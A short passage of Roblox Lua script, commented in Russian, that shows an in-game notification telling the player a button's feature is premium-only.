		StarterGui:SetCore("SendNotification", {
			Title = title,
			Text = text,
			Duration = 5 -- Время отображения уведомления в секундах
		})
	end
	local button = script.Parent
	
	local function leftClick()
		showNotification("Premium-only", "У вас нет premium подписки")
	end
	
